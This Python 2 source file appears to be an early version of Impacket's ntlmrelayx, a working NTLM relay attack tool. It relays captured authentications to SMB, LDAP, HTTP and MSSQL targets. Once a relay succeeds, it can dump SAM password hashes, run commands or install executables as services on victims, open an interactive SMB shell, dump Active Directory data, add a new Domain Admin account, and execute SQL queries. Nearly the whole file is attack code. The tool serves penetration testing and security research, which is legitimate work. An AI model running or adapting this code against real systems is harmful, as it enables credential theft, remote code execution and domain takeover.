#!/usr/bin/python
# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Generic NTLM Relay Module
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This module performs the SMB Relay attacks originally discovered
# by cDc. It receives a list of targets and for every connection received it 
# will choose the next target and try to relay the credentials. Also, if
# specified, it will first to try authenticate against the client connecting 
# to us.
# 
# It is implemented by invoking a SMB and HTTP Server, hooking to a few 
# functions and then using the smbclient portion. It is supposed to be 
# working on any LM Compatibility level. The only way to stop this attack 
# is to enforce on the server SPN checks and or signing.
# 
# If the target system is enforcing signing and a machine account was provided,
# the module will try to gather the SMB session key through 
# NETLOGON (CVE-2015-0005)
#
# If the authentication against the targets succeed, the client authentication 
# success as well and a valid connection is set against the local smbserver. 
# It's up to the user to set up the local smbserver functionality. One option 
# is to set up shares with whatever files you want to the victim thinks it's 
# connected to a valid SMB server. All that is done through the smb.conf file or 
# programmatically.
#

import argparse
import sys
import thread
import logging
import random
import string
import re
import os
from threading import Thread

from impacket import version, smb3, smb
from impacket.examples import logger
from impacket.examples import serviceinstall
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
from impacket.smbconnection import SMBConnection
from smbclient import MiniImpacketShell

class SMBAttack(Thread):
    def __init__(self, config, SMBClient, username):
        Thread.__init__(self)
        self.daemon = True
        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
            self.__SMBConnection = SMBConnection(existingConnection = SMBClient)
        else:
            self.__SMBConnection = SMBClient
        self.config = config
        self.__answerTMP = ''
        if self.config.interactive:
            #Launch locally listening interactive shell
            self.tcpshell = TcpShell()
        else:
            self.tcpshell = None
            if self.config.exeFile is not None:
                self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)

    def __answer(self, data):
        self.__answerTMP += data

    def run(self):
        # Here PUT YOUR CODE!
        if self.tcpshell is not None:
            logging.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
            #Start listening and launch interactive shell
            self.tcpshell.listen()
            self.shell = MiniImpacketShell(self.__SMBConnection,self.tcpshell.socketfile)
            self.shell.cmdloop()
            return
        if self.config.exeFile is not None:
            result = self.installService.install()
            if result is True:
                logging.info("Service Installed.. CONNECT!")
                self.installService.uninstall()
        else:
            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
            samHashes = None
            try:
                # We have to add some flags just in case the original client did not
                # Why? needed for avoiding INVALID_PARAMETER
                flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
                flags2 |= smb.SMB.FLAGS2_LONG_NAMES
                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)

                remoteOps  = RemoteOperations(self.__SMBConnection, False)
                remoteOps.enableRegistry()
            except Exception, e:
                # Something wen't wrong, most probably we don't have access as admin. aborting
                logging.error(str(e))
                return

            try:
                if self.config.command is not None:
                    remoteOps._RemoteOperations__executeRemote(self.config.command)
                    logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                    self.__answerTMP = ''
                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                else:
                    bootKey = remoteOps.getBootKey()
                    remoteOps._RemoteOperations__serviceDeleted = True
                    samFileName = remoteOps.saveSAM()
                    samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                    samHashes.dump()
                    samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                    logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
            except Exception, e:
                logging.error(str(e))
            finally:
                if samHashes is not None:
                    samHashes.finish()
                if remoteOps is not None:
                    remoteOps.finish()

#Define global variables to prevent dumping the domain twice
dumpedDomain = False
addedDomainAdmin = False
class LDAPAttack(Thread):
    def __init__(self, config, LDAPClient, username):
        Thread.__init__(self)
        self.daemon = True

        #Import it here because non-standard dependency
        self.ldapdomaindump = __import__('ldapdomaindump')
        self.client = LDAPClient
        self.username = username.decode('utf-16le')

        #Global config
        self.config = config

    def addDA(self, domainDumper):
        global addedDomainAdmin
        if addedDomainAdmin:
            logging.error('DA already added. Refusing to add another')
            return

        #Random password
        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        #Random username
        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))

        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
            'distinguishedName': 'CN=%s,CN=Users,%s' % (newUser,domainDumper.root),
            'cn': newUser,
            'sn': newUser,
            'givenName': newUser,
            'displayName': newUser,
            'name': newUser,
            'userAccountControl': 512,
            'accountExpires': 0,
            'sAMAccountName': newUser,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }

        res = self.client.connection.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
        if not res:
            logging.error('Failed to add a new user: %s' % str(self.client.connection.result))
        else:
            logging.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))

        #TODO: Fix this with localized DA group
        res = self.client.connection.modify('CN=Domain Admins,CN=Users,%s' % domainDumper.root, {
            'member': [(self.client.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
        if res:
            logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
            logging.info('Domain Admin privileges aquired, shutting down...')
            addedDomainAdmin = True
            thread.interrupt_main()
        else:
            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.connection.result))

    def run(self):
        global dumpedDomain
        #Set up a default config
        domainDumpConfig = self.ldapdomaindump.domainDumpConfig()

        #Change the output directory to configured rootdir
        domainDumpConfig.basepath = self.config.lootdir

        #Create new dumper object
        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client.connection, domainDumpConfig)

        if domainDumper.isDomainAdmin(self.username):
            logging.info('User is a Domain Admin!')
            if self.config.addda:
                if 'ldaps' in self.client.target:
                    self.addDA(domainDumper)
                else:
                    logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
            else:
                logging.info('Not adding a new Domain Admin because of configuration options')
        else:
            logging.info('User is not a Domain Admin')
            if not dumpedDomain and self.config.dumpdomain:
                dumpedDomain = True
                logging.info('Dumping domain info for first time')
                domainDumper.domainDump()

class HTTPAttack(Thread):
    def __init__(self, config, HTTPClient, username):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.client = HTTPClient
        self.username = username

    def run(self):
        #Default action: Dump requested page to file, named username-targetname.html

        #You can also request any page on the server via self.client.session,
        #for example with: 
        #result = self.client.session.get('http://secretserver/secretpage.html')
        #print result.content

        #Remove protocol from target name
        safeTargetName = self.client.target.replace('http://','').replace('https://','')

        #Replace any special chars in the target name
        safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)

        #Combine username with filename
        fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'

        #Write it to the file
        with open(os.path.join(self.config.lootdir,fileName),'w') as of:
            of.write(self.client.lastresult)

class MSSQLAttack(Thread):
    def __init__(self, config, MSSQLClient):
        Thread.__init__(self)
        self.config = config
        self.client = MSSQLClient

    def run(self):
        if self.config.queries is None:
            logging.error('No SQL queries specified for MSSQL relay!')
        else:
            for query in self.config.queries:
                logging.info('Executing SQL: %s' % query)
                self.client.sql_query(query)
                self.client.printReplies()
                self.client.printRows()

# Process command-line arguments.
if __name__ == '__main__':

    RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
    ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack, 'HTTP': HTTPAttack, 'MSSQL': MSSQLAttack }
    # Init the example's logger theme
    logger.init()
    print version.BANNER
    #Parse arguments
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                    "try to relay that connection to specified target(s) system or the original client")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, '
                  'can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
                                                                             'full URL, one per line')
    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                        'automatically (only valid with -tf)')
    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient/mssqlclient console instead'
                        'of executing a command after a successful relay. This console will listen locally on a '
                        ' tcp port and can be reached with for example netcat.')    
    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
    parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR', help='Loot '
                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                   'will be added for ntlm and ntlmv2')
    parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when '
                        'interacting with the domain to grab a session key for signing, format is domain/machine_name')
    parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
    parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')

    #SMB arguments
    smboptions = parser.add_argument_group("SMB client options")
    smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                                          'directory).')

    #MSSQL arguments
    mssqloptions = parser.add_argument_group("MSSQL client options")
    mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
                        '(can specify multiple)')
    
    #HTTP options (not in use for now)
    # httpoptions = parser.add_argument_group("HTTP client options")
    # httpoptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
    #                     '(can specify multiple)')   

    #LDAP options
    ldapoptions = parser.add_argument_group("LDAP client options")
    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information') 
    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin') 

    try:
       options = parser.parse_args()
    except Exception, e:
       logging.error(str(e))
       sys.exit(1)

    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singletarget=options.target)
    else:
        if options.tf is not None:
            #Targetfile specified
            logging.info("Running in relay mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetlistfile=options.tf)
            mode = 'RELAY'
        else:
            logging.info("Running in reflection mode")
            targetSystem = None
            mode = 'REFLECTION'

    if options.r is not None:
        logging.info("Running HTTP server in redirect mode")

    #print targetSystem.targets
    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    if options.lootdir is not None:
        lootdir = options.lootdir
    else:
        lootdir = '.'

    exeFile = options.e
    Command = options.c

    for server in RELAY_SERVERS:
        #Set up config
        c = NTLMRelayxConfig()
        c.setTargets(targetSystem)
        c.setExeFile(exeFile)
        c.setCommand(Command)
        c.setMode(mode)
        c.setAttacks(ATTACKS)
        c.setLootdir(lootdir)
        c.setOutputFile(options.output_file)
        c.setLDAPOptions(options.no_dump,options.no_da)
        c.setMSSQLOptions(options.query)
        c.setInteractive(options.interactive)

        #If the redirect option is set, configure the HTTP server to redirect targets to SMB
        if server is HTTPRelayServer and options.r is not None:
            c.setMode('REDIRECT')
            c.setRedirectHost(options.r)

        #Use target randomization if configured and the server is not SMB
        #SMB server at the moment does not properly store active targets so selecting them randomly will cause issues
        if server is not SMBRelayServer and options.random:
            c.setRandomTargets(True)

        if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
            c.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
        elif (options.machine_account is None and options.machine_hashes is None and options.domain is None) is False:
            logging.error("You must specify machine-account/hashes/domain all together!")
            sys.exit(1)

        s = server(c)
        s.start()
        
    print ""
    logging.info("Servers started, waiting for connections")
    while True:
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            sys.exit(1)
        else:
            pass
